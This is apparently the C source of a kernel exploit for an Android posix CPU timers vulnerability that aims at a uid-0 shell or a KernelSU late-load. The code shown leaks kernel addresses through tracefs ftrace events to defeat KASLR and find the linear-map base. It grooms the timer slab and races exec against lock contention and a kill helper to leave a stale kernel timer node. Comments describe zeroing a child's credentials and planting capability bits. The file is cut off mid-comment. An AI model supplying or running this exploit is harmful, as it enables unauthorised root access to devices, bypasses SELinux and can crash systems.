/**
 * CVE-2026-98260 - posix cpu timers: uid-0 shell + KernelSU late-load
 * Target : selected by one compile-time exact-profile parameter header
 * Kernel : AVD Android 14 6.1 by default; A301SO 5.15 retained for diagnosis
 * SELinux: Enforcing
 * Patches: CVE fix absent in exact begin_new_exec() disassembly
 * Mitig. : KASLR=on PAN=on; HW-tag KASAN/MTE, KFENCE and SLUB hardening enabled
 *
 * Adapted from woshigenm/CVE-2026-98260 (MIT) and the other 98260 ports.
 * The selected header owns trigger semantics, slab geometry, structure layout,
 * call sites, and symbols. Tracefs event ids remain runtime discoveries.
 *
 * Two endgames:
 *
 *   default / shell / verify
 *     One zero write to the child's real cred clears uid/gid.  The child
 *     calls setuid(0) and execs sh -> uid 0 in u:r:shell:s0.  This is a
 *     shell-domain root with only the bounding-set capabilities.
 *
 *   fake
 *     Plant reclaimed-node pointers into the child's real cred capability
 *     fields; only values carrying the CAP_SYS_MODULE bit are accepted.  The
 *     simplified KSU route plants Inheritable and Permitted, clears uid/gid,
 *     raises Ambient after setuid(0), and execs the manager's kallsyms-aware
 *     ksud loader.  This removes the former fake-cred lifetime and refcount
 *     constraint while retaining capability across exec.
 *
 * The trigger leaves a stale timerqueue node; every failed plant parks
 * without reaping (a reaped uncontrolled node panics this kernel).  Reboot
 * is the only cleanup.  Event ids and the linear-map base are discovered at
 * runtime; the tracefs metadata files are not readable from the shell domain.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdatomic.h>
#include <time.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/stat.h>

#include "target_params.h"

#define TR GLK98260_TRACEFS
#define CPU_TRIG GLK98260_TRIGGER_CPU
#define NTIMERS GLK98260_TIMER_COUNT
#define VICTIM_IDX GLK98260_VICTIM_INDEX
#define PREFILL_TIMERS GLK98260_PREFILL_TIMER_COUNT
#define VMA_COUNT GLK98260_VMA_COUNT
#define HELPER_STACK GLK98260_HELPER_STACK_BYTES
#define LOCKERS GLK98260_LOCKER_COUNT
#define PAGE GLK98260_PAGE_SIZE
#define SOCKBUF GLK98260_SOCKBUF_BYTES
#define STATIC_TIMER_SITE GLK98260_TIMER_ALLOC_SITE_STATIC
#define TIMER_SITE_LOW21 GLK98260_TIMER_ALLOC_SITE_LOW21
#define TIMER_ALLOC GLK98260_TIMER_OBJECT_ALLOC
#define CRED_REQ GLK98260_CRED_OBJECT_REQ
#define CRED_ALLOC GLK98260_CRED_OBJECT_ALLOC
#define SELINUX_STATE_STATIC GLK98260_SELINUX_STATE_STATIC
#define PANIC_ON_WARN_STATIC GLK98260_PANIC_ON_WARN_STATIC
#define CRED_UID_OFF GLK98260_CRED_UID_OFF
#define OFF_TASK_CRED GLK98260_TASK_CRED_OFF
#define COPY_PROCESS_LOW21 GLK98260_TASK_ALLOC_SITE_LOW21
#define TASK_ALLOC_BYTES GLK98260_TASK_OBJECT_REQ
#define FULLCAP GLK98260_FULLCAP
#define ROOT_USER_STATIC GLK98260_ROOT_USER_STATIC
#define INIT_USER_NS_STATIC GLK98260_INIT_USER_NS_STATIC
#define INIT_UCOUNTS_STATIC GLK98260_INIT_UCOUNTS_STATIC
#define INIT_GROUPS_STATIC GLK98260_INIT_GROUPS_STATIC
#define SELINUX_SID_KERNEL GLK98260_SELINUX_SID_KERNEL

#define CHILD_HELLO 0x52445931
#define CHILD_MAGIC 0x50474552

struct child_report
{
    int magic;
    int uid, euid;
    int setgid_ret, setgid_errno;
    int setuid_ret, setuid_errno;
    int ruid, reuid, rsuid;
    int fsuid, fsgid;
    int ambient_ret, ambient_errno;
};

/**
 * @brief Send one command to the blocked credential child and read its report.
 * @param go_fd Parent write end of the inherited child command pipe.
 * @param st_fd Parent read end of the child status pipe.
 * @param command GLK98260_CHILD_COMMAND_VERIFY or _COMMIT.
 * @param rep Output report, valid only when the function returns zero.
 * @return Zero for a complete report with the expected magic, otherwise -1.
 * @note VERIFY does not release the child; COMMIT advances it to setresgid/setuid.
 * @note Stage: target real-cred write verification before fake/KSU is allowed.
 */
static int child_command_report(int go_fd, int st_fd, char command,
                                struct child_report *rep)
{
    struct pollfd pf = {.fd = st_fd, .events = POLLIN};
    ssize_t rn;

    if (write(go_fd, &command, 1) != 1)
        return -1;
    if (poll(&pf, 1, GLK98260_CHILD_REPORT_TIMEOUT_MS) <= 0)
        return -1;
    memset(rep, 0, sizeof(*rep));
    rn = read(st_fd, rep, sizeof(*rep));
    return rn == (ssize_t)sizeof(*rep) && rep->magic == CHILD_MAGIC ? 0 : -1;
}

static _Atomic int g_go, g_stop, g_locker_started, g_locker_cpu;
#if GLK98260_EXEC_MMAP_HAS_KILLABLE_MMAP_LOCK
static _Atomic int g_exec_tid, g_target_tgid;
#endif
static void *g_frag_base;
static size_t g_frag_len;
static int g_ready_w = -1, g_ack_r = -1, g_tid_w = -1;
static int g_timer_go_r = -1, g_timer_go_w = -1;
static int g_cpu = CPU_TRIG;
static unsigned long long g_base;
static unsigned long long g_slide;
static int g_slide_ready;
static int g_held;
static int g_fake_stage;
static unsigned long long g_child_task;
static unsigned g_t_page_alloc, g_t_page_free;

static void logf(const char *fmt, ...);

static void slab_usage(const char *tag)
{
    FILE *f = fopen("/proc/slabinfo", "r");
    char line[256];

    if (!f)
        return;
    while (fgets(line, sizeof(line), f))
    {
        unsigned active = 0, total = 0;

        if (strncmp(line, "posix_timers_cache", 18))
            continue;
        if (sscanf(line, "posix_timers_cache %u %u", &active, &total) == 2)
            logf("[slab] %s active=%u total=%u\n", tag, active, total);
        break;
    }
    fclose(f);
}

static void logf(const char *fmt, ...)
{
    va_list ap;

    va_start(ap, fmt);
    vprintf(fmt, ap);
    va_end(ap);
    (void)fsync(STDOUT_FILENO);
}

static int wr(const char *p, const char *s)
{
    int fd = open(p, O_WRONLY);
    if (fd < 0)
        return -1;
    ssize_t r = write(fd, s, strlen(s));
    close(fd);
    return r < 0 ? -1 : 0;
}

/**
 * @brief Enlarge every per-CPU trace ring before event-id calibration.
 * @return Zero when the kernel reports at least the requested size, else -1.
 * @note The AVD default is only 7 KiB and overwrites the allocation half of
 *       the alloc/free calibration before the raw reader can pair PFNs.
 * @note Stage: ids preflight; failure stops before any vulnerability trigger.
 */
static int configure_trace_buffer(void)
{
    char requested[32];
    unsigned actual = 0;
    FILE *f;

    (void)snprintf(requested, sizeof(requested), "%u",
                   GLK98260_TRACE_BUFFER_KB);
    if (wr(TR "/buffer_size_kb", requested) != 0)
        return -1;
    f = fopen(TR "/buffer_size_kb", "r");
    if (!f)
        return -1;
    if (fscanf(f, "%u", &actual) != 1)
        actual = 0;
    fclose(f);
    logf("[trace] buffer_size_kb=%u requested=%u\n", actual,
         GLK98260_TRACE_BUFFER_KB);
    return actual >= GLK98260_TRACE_BUFFER_KB ? 0 : -1;
}

static void pin(int cpu)
{
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    sched_setaffinity(0, sizeof(set), &set);
}
static unsigned u32(const unsigned char *b, size_t o)
{
    unsigned v;
    memcpy(&v, b + o, 4);
    return v;
}
static unsigned long long u64(const unsigned char *b, size_t o)
{
    unsigned long long v;
    memcpy(&v, b + o, 8);
    return v;
}

static void enable_events(void)
{
    static const char *evs[] = {
        "enable_event:kmem:kmem_cache_alloc\n",
        "enable_event:kmem:kmem_cache_free\n",
        "enable_event:kmem:mm_page_free\n",
        "enable_event:kmem:mm_page_alloc\n",
    };
    for (unsigned i = 0; i < sizeof(evs) / sizeof(evs[0]); i++)
        wr(TR "/events/kmem/rss_stat/trigger", evs[i]);
}

static void drain_cpu(int cpu)
{
    unsigned char tmp[65536];
    char path[128];
    snprintf(path, sizeof(path), TR "/per_cpu/cpu%d/trace_pipe_raw", cpu);
    int fd = open(path, O_RDONLY | O_NONBLOCK);
    if (fd < 0)
        return;
    while (read(fd, tmp, sizeof(tmp)) > 0)
        ;
    close(fd);
}
static void trace_start(void)
{
    wr(TR "/tracing_on", "0");
    wr(TR "/trace", "\n");
    drain_cpu(g_cpu);
    wr(TR "/tracing_on", "1");
}
static void trace_stop(void) { wr(TR "/tracing_on", "0"); }

static long read_cpu(int cpu, unsigned char *buf, size_t cap)
{
    char path[128];
    size_t tot = 0;
    snprintf(path, sizeof(path), TR "/per_cpu/cpu%d/trace_pipe_raw", cpu);
    int fd = open(path, O_RDONLY | O_NONBLOCK);
    if (fd < 0)
        return -1;
    while (tot < cap)
    {
        ssize_t r = read(fd, buf + tot, cap - tot);
        if (r <= 0)
            break;
        tot += (size_t)r;
    }
    close(fd);
    return (long)tot;
}

static int is_kernel_ptr(unsigned long long v)
{
    return (v >> 48) == 0xffffULL;
}

/*
 * Raw ftrace field layout (per-boot ids have no readable metadata):
 *   kmem_cache_alloc: [i-4] pid, [i] site, [i+8] ptr, [i+16] req, [i+24] alloc
 *   mm_page_alloc/free: [i-8] type, [i-4] pid, [i] pfn, [i+8] order
 */
static int scan_timer_allocs(const unsigned char *b, size_t n, int pid,
                             unsigned long long *out, int max,
                             unsigned long long *first_site)
{
    int cnt = 0;

    for (size_t i = 8; i + 32 <= n; i += GLK98260_TRACE_SCAN_STRIDE)
    {
        unsigned long long site, ptr;

        if (u32(b, i - GLK98260_TRACE_ALLOC_PID_BEFORE_SITE) !=
            (unsigned)pid)
            continue;
        site = u64(b, i);
        if ((site & GLK98260_TRACE_SITE_LOW_MASK) != TIMER_SITE_LOW21)
            continue;
        ptr = u64(b, i + GLK98260_TRACE_ALLOC_PTR_AFTER_SITE);
        if (u64(b, i + GLK98260_TRACE_ALLOC_REQ_AFTER_SITE) !=
                GLK98260_TIMER_OBJECT_REQ ||
            u64(b, i + GLK98260_TRACE_ALLOC_SIZE_AFTER_SITE) != TIMER_ALLOC ||
            !is_kernel_ptr(ptr))
            continue;
        if (!cnt && first_site)
            *first_site = site;
        if (cnt < max)
            out[cnt++] = ptr;
    }
    return cnt;
}

static int scan_cred_allocs(const unsigned char *b, size_t n, int pid,
                            unsigned long long *site_out,
                            unsigned long long *ptr_out)
{
    unsigned long long candidates[8] = {0};
    unsigned alloc_type = 0;
    int candidate_count = 0, freed_count = 0, survivors = 0;

    for (size_t i = 16; i + 24 <= n; i += GLK98260_TRACE_SCAN_STRIDE)
    {
        unsigned long long site, ptr;

        if (u32(b, i - GLK98260_TRACE_CRED_PID_BEFORE_PTR) !=
            (unsigned)pid)
            continue;
        ptr = u64(b, i);
        if (!is_kernel_ptr(ptr) ||
            u64(b, i + GLK98260_TRACE_CRED_REQ_AFTER_PTR) != CRED_REQ ||
            u64(b, i + GLK98260_TRACE_CRED_SIZE_AFTER_PTR) != CRED_ALLOC)
            continue;
        site = u64(b, i - GLK98260_TRACE_CRED_SITE_BEFORE_PTR);
        if (!is_kernel_ptr(site) ||
            (site & GLK98260_TRACE_SITE_LOW_MASK) !=
                GLK98260_CRED_ALLOC_SITE_LOW21)
            continue;
        if (!alloc_type)
            alloc_type = u32(b, i - GLK98260_TRACE_EVENT_TYPE_BEFORE_PTR) &
                         0xffff;
        if ((u32(b, i - GLK98260_TRACE_EVENT_TYPE_BEFORE_PTR) & 0xffff) !=
            alloc_type)
            continue;
        int duplicate = 0;
        for (int j = 0; j < candidate_count; j++)
            if (candidates[j] == ptr)
                duplicate = 1;
        if (!duplicate)
        {
            if (candidate_count == (int)(sizeof(candidates) /
                                         sizeof(candidates[0])))
                return 0;
            candidates[candidate_count++] = ptr;
        }
    }
    for (int j = 0; j < candidate_count; j++)
    {
        int freed = 0;

        for (size_t i = GLK98260_TRACE_EVENT_TYPE_BEFORE_PTR;
             i + sizeof(unsigned long long) <= n;
             i += GLK98260_TRACE_SCAN_STRIDE)
        {
            unsigned type =
                u32(b, i - GLK98260_TRACE_EVENT_TYPE_BEFORE_PTR) & 0xffff;
            unsigned long long site;

            if (type == alloc_type ||
                u32(b, i - GLK98260_TRACE_CRED_PID_BEFORE_PTR) !=
                    (unsigned)pid ||
                u64(b, i) != candidates[j])
                continue;
            site = u64(b, i - GLK98260_TRACE_CRED_SITE_BEFORE_PTR);
            if (is_kernel_ptr(site))
            {
                freed = 1;
                break;
            }
        }
        if (freed)
        {
            freed_count++;
            continue;
        }
        *site_out = GLK98260_CRED_ALLOC_SITE_STATIC;
        *ptr_out = candidates[j];
        survivors++;
    }
    logf("[cred] alloc_candidates=%d freed=%d survivors=%d alloc_type=%u\n",
         candidate_count, freed_count, survivors, alloc_type);
    return survivors;
}

static int scan_task_allocs(const unsigned char *b, size_t n, int pid,
                            unsigned long long *out)
{
    int found = 0;

    for (size_t i = 8; i + 32 <= n; i += GLK98260_TRACE_SCAN_STRIDE)
    {
        unsigned long long site, ptr, req, alloc;

        if (u32(b, i - GLK98260_TRACE_ALLOC_PID_BEFORE_SITE) !=
            (unsigned)pid)
            continue;
        site = u64(b, i);
        if ((site & GLK98260_TRACE_SITE_LOW_MASK) != COPY_PROCESS_LOW21)
            continue;
        ptr = u64(b, i + GLK98260_TRACE_ALLOC_PTR_AFTER_SITE);
        req = u64(b, i + GLK98260_TRACE_ALLOC_REQ_AFTER_SITE);
        alloc = u64(b, i + GLK98260_TRACE_ALLOC_SIZE_AFTER_SITE);
        if (!is_kernel_ptr(ptr))
            continue;
        if (req != TASK_ALLOC_BYTES || alloc != GLK98260_TASK_OBJECT_ALLOC)
            continue;
        *out = ptr;
        found++;
    }
    return found;
}

static int scan_page_free(const unsigned char *b, size_t n,
                          unsigned long long pfn)
{
    for (size_t i = 16; i + 12 <= n; i += GLK98260_TRACE_SCAN_STRIDE)
    {
        if (u64(b, i) != pfn ||
            (int)u32(b, i + GLK98260_TRACE_PAGE_ORDER_AFTER_PFN) !=
                (int)GLK98260_TIMER_SLAB_ORDER)
            continue;
        if ((u32(b, i - GLK98260_TRACE_PAGE_TYPE_BEFORE_PFN) & 0xffff) ==
            g_t_page_free)
            return 1;
    }
    return 0;
}

struct page_pair
{
    unsigned long long pfn;
    unsigned alloc_type, free_type, hits;
};

/*
 * Page event ids are assigned at boot and the tracefs metadata is root-only.
 * Allocate/free anonymous pages and pair the same pfn: first alloc, then free.
 */
static int discover_page_types(unsigned char *raw)
{
    struct page_pair pairs[2048];
    int np = 0, me = getpid();
    size_t len = 1024 * PAGE;
    unsigned char *m;
    long n;

    trace_stop();
    wr(TR "/trace", "\n");
    for (int c = 0; c < GLK98260_TRACE_CPU_COUNT; c++)
        drain_cpu(c);
    trace_start();
    m = mmap(NULL, len, PROT_READ | PROT_WRITE,
             MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (m == MAP_FAILED)
    {
        trace_stop();
        return -1;
    }
    for (size_t i = 0; i < len; i += PAGE)
        m[i] = 1;
    munmap(m, len);
    usleep(30000);
    trace_stop();

    n = read_cpu(g_cpu, raw, 32u << 20);
    if (n <= 0)
        return -1;
    for (size_t i = 16; i + 12 <= (size_t)n;
         i += GLK98260_TRACE_SCAN_STRIDE)
    {
        unsigned long long pfn = u64(raw, i);
        unsigned order, type;

        if (pfn >= GLK98260_TRACE_PFN_LIMIT)
            continue;
        order = u32(raw, i + GLK98260_TRACE_PAGE_ORDER_AFTER_PFN);
        if (order > 10)
            continue;
        if (u32(raw, i - GLK98260_TRACE_PAGE_PID_BEFORE_PFN) !=
            (unsigned)me)
            continue;
        type = u32(raw, i - GLK98260_TRACE_PAGE_TYPE_BEFORE_PFN) & 0xffff;
        if (!type || type > 1024)
            continue;
        for (int k = 0; k < np; k++)
        {
            if (pairs[k].pfn == pfn)
            {
                if (!pairs[k].alloc_type)
                    pairs[k].alloc_type = type;
                else if (!pairs[k].free_type)
                    pairs[k].free_type = type;
                pairs[k].hits++;
                goto next;
            }
        }
        if (np < 2048)
        {
            pairs[np].pfn = pfn;
            pairs[np].alloc_type = type;
            pairs[np].hits = 1;
            np++;
        }
    next:;
    }

    {
        struct page_pair *best = NULL;

        for (int k = 0; k < np; k++)
            if (pairs[k].alloc_type && pairs[k].free_type &&
                pairs[k].alloc_type != pairs[k].free_type &&
                (!best || pairs[k].hits > best->hits))
                best = &pairs[k];
        if (!best)
        {
            logf("[-] page event ids not found (records=%zu pairs=%d)\n",
                 (size_t)n, np);
            return -1;
        }
        g_t_page_alloc = best->alloc_type;
        g_t_page_free = best->free_type;
    }
    logf("[ids] page_alloc=%u page_free=%u pairs=%d\n",
         g_t_page_alloc, g_t_page_free, np);
    return 0;
}

/*
 * Vote the linear-map base from the target's timer slabs and same-PID order-1
 * page_alloc pfns.  Partial-slab pairings are noise; the true base wins by
 * roughly one vote per slab.
 */
struct base_slot
{
    unsigned long long key;
    int cnt;
};

static unsigned long long plant_base(const unsigned char *b, size_t n, int pid,
                                     const unsigned long long *ptrs, int nrec,
                                     int *out_slabs, int *out_pfns)
{
    enum
    {
        MAXS = 256,
        MAXP = 512,
        HBITS = 16,
        HSIZE = 1 << HBITS
    };
    unsigned long long slabs[MAXS], pfns[MAXP];
    static struct base_slot tab[HSIZE];
    int ns = 0, np = 0;
    unsigned long long best_base = 0;
    int best_cnt = 0;

    memset(tab, 0, sizeof(tab));
    for (int i = 0; i < nrec && ns < MAXS; i++)
    {
        unsigned long long s = ptrs[i] & ~GLK98260_TIMER_SLAB_MASK;
        int dup = 0;

        for (int j = 0; j < ns; j++)
            if (slabs[j] == s)
            {
                dup = 1;
                break;
            }
        if (!dup)
            slabs[ns++] = s;
    }
    for (size_t i = 16; i + 12 <= n && np < MAXP;
         i += GLK98260_TRACE_SCAN_STRIDE)
    {
        unsigned long long pfn = u64(b, i);
        int dup = 0;

        if (pfn >= GLK98260_TRACE_PFN_LIMIT ||
            (int)u32(b, i + GLK98260_TRACE_PAGE_ORDER_AFTER_PFN) !=
                (int)GLK98260_TIMER_SLAB_ORDER ||
            u32(b, i - GLK98260_TRACE_PAGE_PID_BEFORE_PFN) != (unsigned)pid ||
            (u32(b, i - GLK98260_TRACE_PAGE_TYPE_BEFORE_PFN) & 0xffff) !=
                g_t_page_alloc)
            continue;
        for (int j = 0; j < np; j++)
            if (pfns[j] == pfn)
            {
                dup = 1;
                break;
            }
        if (!dup)
            pfns[np++] = pfn;
    }
    for (int i = 0; i < ns; i++)
    {
        for (int j = 0; j < np; j++)
        {
            unsigned long long base =
                slabs[i] - (pfns[j] << GLK98260_PAGE_SHIFT);
            unsigned h =
                (unsigned)((base >> GLK98260_PAGE_SHIFT) * 2654435761u) &
                         (HSIZE - 1);

            for (int k = 0; k < 64; k++, h = (h + 1) & (HSIZE - 1))
            {
                if (!tab[h].key)
                {
                    tab[h].key = base;
                    tab[h].cnt = 1;
                    break;
                }
                if (tab[h].key == base)
                {
                    tab[h].cnt++;
                    break;
                }
            }
        }
    }
    for (int i = 0; i < HSIZE; i++)
        if (tab[i].key && tab[i].cnt > best_cnt)
        {
            best_cnt = tab[i].cnt;
            best_base = tab[i].key;
        }
    *out_slabs = ns;
    *out_pfns = np;
    return best_cnt >= 8 ? best_base : 0;
}

static unsigned long long calibrate_base(unsigned char *raw)
{
    unsigned long long hist[64] = {0}, hcnt[64] = {0};
    unsigned long long recent[64];
    unsigned long long ptrs[512];
    int hc = 0, rn = 0, made = 0, me = getpid();
    long n;

    trace_start();
    for (int i = 0; i < 512; i++)
    {
        struct sigevent ev;
        timer_t t;

        memset(&ev, 0, sizeof(ev));
        ev.sigev_notify = SIGEV_NONE;
        if (timer_create(CLOCK_MONOTONIC, &ev, &t))
            break;
        made++;
    }
    usleep(3000);
    trace_stop();
    n = read_cpu(g_cpu, raw, 32u << 20);
    if (n <= 0)
        return 0;

    {
        unsigned long long first_site = 0;
        int c = scan_timer_allocs(raw, (size_t)n, me, ptrs, 512,
                                  &first_site);

        if (first_site >= STATIC_TIMER_SITE)
        {
            g_slide = first_site - STATIC_TIMER_SITE;
            g_slide_ready = 1;
        }

        for (size_t i = 16; i + 12 <= (size_t)n;
             i += GLK98260_TRACE_SCAN_STRIDE)
        {
            unsigned long long pfn = u64(raw, i);

            if (pfn >= GLK98260_TRACE_PFN_LIMIT ||
                (int)u32(raw, i + GLK98260_TRACE_PAGE_ORDER_AFTER_PFN) !=
                    (int)GLK98260_TIMER_SLAB_ORDER ||
                u32(raw, i - GLK98260_TRACE_PAGE_PID_BEFORE_PFN) !=
                    (unsigned)me ||
                (u32(raw, i - GLK98260_TRACE_PAGE_TYPE_BEFORE_PFN) & 0xffff) !=
                    g_t_page_alloc)
                continue;
            if (rn == 64)
                memmove(recent, recent + 1, 63 * sizeof(recent[0])), rn--;
            recent[rn++] = pfn;
        }
        for (int i = 0; i < c; i++)
        {
            unsigned long long slab = ptrs[i] & ~GLK98260_TIMER_SLAB_MASK;

            for (int j = 0; j < rn; j++)
            {
                unsigned long long base =
                    slab - (recent[j] << GLK98260_PAGE_SHIFT);
                int f = 0;

                for (int k = 0; k < hc; k++)
                    if (hist[k] == base)
                    {
                        hcnt[k]++;
                        f = 1;
                        break;
                    }
                if (!f && hc < 64)
                {
                    hist[hc] = base;
                    hcnt[hc] = 1;
                    hc++;
                }
            }
        }
        logf("[base] timer_recs=%d order%u_pfns=%d raw=%ld site=%#llx cpu=%d\n",
             c, GLK98260_TIMER_SLAB_ORDER, rn, n, first_site, sched_getcpu());
    }
    {
        unsigned long long best = 0, bestc = 0;

        for (int k = 0; k < hc; k++)
            if (hcnt[k] > bestc)
            {
                bestc = hcnt[k];
                best = hist[k];
            }
        logf("[base] made=%d best=%#llx count=%llu slide=%#llx\n",
             made, best, bestc, g_slide);
        return bestc >= 4 ? best : 0;
    }
}

static void kick_rss(void)
{
    size_t n = (size_t)32 << 20;
    char *p = mmap(NULL, n, PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    if (p == MAP_FAILED)
        return;
    for (size_t i = 0; i < n; i += PAGE)
        p[i] = 1;
    munmap(p, n);
}

static timer_t *g_prefill;

static void prefill_timers(int n)
{
    struct sigevent ev;

    g_prefill = calloc((size_t)n, sizeof(*g_prefill));
    if (!g_prefill)
        return;
    memset(&ev, 0, sizeof(ev));
    ev.sigev_notify = SIGEV_NONE;
    for (int i = 0; i < n; i++)
    {
        if (timer_create(CLOCK_MONOTONIC, &ev, &g_prefill[i]))
            break;
    }
}

static int prepare_fragmented_range(void)
{
    size_t len = (size_t)VMA_COUNT * PAGE;
    int fd = (int)syscall(SYS_memfd_create, "vma-page", 1);
    void *base;
    if (fd < 0 || ftruncate(fd, PAGE))
        return -1;
    base = mmap(NULL, len, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (base == MAP_FAILED)
        return -1;
    for (unsigned long i = 0; i < VMA_COUNT; i++)
    {
        void *want = (char *)base + i * PAGE;
        if (mmap(want, PAGE, PROT_READ, MAP_SHARED | MAP_FIXED, fd, 0) != want)
            return -1;
    }
    close(fd);
    g_frag_base = base;
    g_frag_len = len;
    return 0;
}

static int locker_fn(void *x)
{
    int prot = PROT_NONE;
    unsigned slot = (unsigned)atomic_fetch_add(&g_locker_cpu, 1);
    (void)x;
    pin(slot ? GLK98260_LOCKER_CPU_B : GLK98260_LOCKER_CPU_A);
    while (!atomic_load(&g_go))
        sched_yield();
    atomic_fetch_add(&g_locker_started, 1);
    while (!atomic_load(&g_stop))
    {
        syscall(SYS_mprotect, g_frag_base, g_frag_len, prot);
        prot = prot == PROT_NONE ? PROT_READ : PROT_NONE;
    }
    _exit(0);
}
#if GLK98260_TRIGGER_HAS_CORE_STATE_COREDUMP
/**
 * @brief Queue a real coredump writer on the shared old mm.
 * @param x Unused clone argument.
 * @return Does not return during a normal trigger; 0 is unreachable fallback.
 * @note The exec thread releases this helper only after all mmap lockers have
 *       entered their loop. The helper is a separate CLONE_VM process, so
 *       de_thread does not remove it. It uses raw getpid/gettid syscalls because
 *       libc PID caches are not valid after clone(CLONE_VM) without pthreads.
 */
static int coredump_fn(void *x)
{
    (void)x;
    pin(GLK98260_COREDUMP_CPU);
    (void)signal(SIGSEGV, SIG_DFL);
    while (atomic_load(&g_locker_cpu) != GLK98260_CORE_GO_SENTINEL)
        sched_yield();
    atomic_store(&g_locker_cpu, GLK98260_CORE_RAISE_SENTINEL);
    (void)syscall(SYS_tgkill, syscall(SYS_getpid), syscall(SYS_gettid),
                  SIGSEGV);
    for (;;)
        pause();
}
#else
/**
 * @brief Deliver SIGKILL after the exec thread has entered exec_mmap.
 * @param x Unused clone argument.
 * @return Zero only after the fatal signal is sent and lockers are stopped.
 * @note This helper requires mmap_read_lock_killable in exact exec_mmap.
 * @note Stage: create the stale timerqueue node on the AVD 6.1 profile.
 */
static int killer_fn(void *x)
{
    int tid, tgid;

    (void)x;
    pin(CPU_TRIG);
    while (!(tid = atomic_load(&g_exec_tid)))
        sched_yield();
    tgid = atomic_load(&g_target_tgid);
    for (;;)
    {
        long r = syscall(SYS_tgkill, tgid, tid, 0);

        if (r < 0 && errno == ESRCH)
            break;
        sched_yield();
    }
    (void)syscall(SYS_tgkill, tgid, tgid, SIGKILL);
    atomic_store(&g_stop, 1);
    _exit(0);
}
#endif
static int spawn_vm_helper(int (*fn)(void *))
{
    void *st = mmap(NULL, HELPER_STACK, PROT_READ | PROT_WRITE,
                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (st == MAP_FAILED)
        return -1;
    int p = clone(fn, (char *)st + HELPER_STACK, CLONE_VM | SIGCHLD, NULL);
    if (p < 0)
        munmap(st, HELPER_STACK);
    return p;
}

static void *exec_thread(void *x)
{
    struct sigevent ev_none, ev_victim;
    struct itimerspec dormant;
    char b = 'R', ack;
    char *const argv[] = {(char *)"", NULL};
    char *const envp[] = {NULL};
    (void)x;
    pin(2);
    prctl(PR_SET_NAME, "yexec", 0, 0, 0);
    memset(&ev_none, 0, sizeof(ev_none));
    ev_none.sigev_notify = SIGEV_NONE;
    memset(&ev_victim, 0, sizeof(ev_victim));
    ev_victim.sigev_notify = SIGEV_SIGNAL;
    ev_victim.sigev_signo = SIGRTMIN;
    memset(&dormant, 0, sizeof(dormant));
    dormant.it_value.tv_sec = 3600;

    if (write(g_ready_w, &b, 1) != 1)
        _exit(117);
    if (read(g_ack_r, &ack, 1) != 1)
        _exit(118);

    for (int i = 0; i < NTIMERS; i++)
    {
        timer_t t;
        struct sigevent *e = (i == VICTIM_IDX) ? &ev_victim : &ev_none;
        if (timer_create(CLOCK_THREAD_CPUTIME_ID, e, &t))
            _exit(120);
        if (i == VICTIM_IDX && timer_settime(t, 0, &dormant, NULL))
            _exit(121);
    }
    {
        int tid = (int)syscall(SYS_gettid);
#if GLK98260_EXEC_MMAP_HAS_KILLABLE_MMAP_LOCK
        atomic_store(&g_exec_tid, tid);
#endif
        if (write(g_tid_w, &tid, sizeof(tid)) != sizeof(tid))
            _exit(122);
    }
    /* Keep the target paused until the parent has captured V and armed the
     * spray; the free still has not happened at this point. */
    if (g_timer_go_r >= 0)
    {
        char tgo;

        if (read(g_timer_go_r, &tgo, 1) != 1)
            _exit(124);
    }
    atomic_store(&g_go, 1);
    while (atomic_load(&g_locker_started) < LOCKERS)
        sched_yield();
    for (volatile unsigned long i = 0; i < GLK98260_CORE_PRE_EXEC_SPINS; i++)
        __asm__ volatile("" ::: "memory");
#if GLK98260_TRIGGER_HAS_CORE_STATE_COREDUMP
    atomic_store(&g_locker_cpu, GLK98260_CORE_GO_SENTINEL);
    while (atomic_load(&g_locker_cpu) != GLK98260_CORE_RAISE_SENTINEL)
        sched_yield();
    for (volatile unsigned long i = 0;
         i < GLK98260_CORE_POST_RAISE_SPINS; i++)
        __asm__ volatile("" ::: "memory");
#endif
    execve("/proc/self/exe", argv, envp);
    _exit(123);
}

static void run_target(void)
{
    pthread_t th;
    sigset_t set;
#if GLK98260_TRIGGER_HAS_CORE_STATE_COREDUMP
    struct rlimit core_limit = {
        .rlim_cur = (rlim_t)GLK98260_CORE_LIMIT_BYTES,
        .rlim_max = (rlim_t)GLK98260_CORE_LIMIT_BYTES};
#else
    atomic_store(&g_target_tgid, (int)getpid());
#endif

    pin(CPU_TRIG);
#if GLK98260_TRIGGER_HAS_CORE_STATE_COREDUMP
    if (setrlimit(RLIMIT_CORE, &core_limit) != 0 ||
        prctl(PR_SET_DUMPABLE, 1, 0, 0, 0) != 0)
        _exit(109);
#endif
    if (prepare_fragmented_range())
        _exit(110);
    for (int i = 0; i < LOCKERS; i++)
        if (spawn_vm_helper(locker_fn) < 0)
            _exit(111);
#if GLK98260_TRIGGER_HAS_CORE_STATE_COREDUMP
    if (spawn_vm_helper(coredump_fn) < 0)
#else
    if (spawn_vm_helper(killer_fn) < 0)
#endif
        _exit(112);
    sigemptyset(&set);
    sigaddset(&set, SIGRTMIN);
    pthread_sigmask(SIG_BLOCK, &set, NULL);
    if (pthread_create(&th, NULL, exec_thread, NULL))
        _exit(114);
    for (;;)
        sched_yield();
}

static int wait_zombie(pid_t pid, siginfo_t *si)
{
    struct timespec pause = {.tv_nsec = 200000};
    for (int i = 0; i < 2000; i++)
    {
        memset(si, 0, sizeof(*si));
        if (waitid(P_PID, (id_t)pid, si, WEXITED | WNOHANG | WNOWAIT))
            return -1;
        if (si->si_pid == pid)
            return 0;
        nanosleep(&pause, NULL);
    }
    return -1;
}

static long now_ms(void)
{
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (long)ts.tv_sec * 1000 + ts.tv_nsec / 1000000;
}

static void park_forever(const char *why)
{
    logf("[!] %s -- parking without reap (zombie held)\n", why);
    fflush(stdout);
    for (;;)
        pause();
}

/**
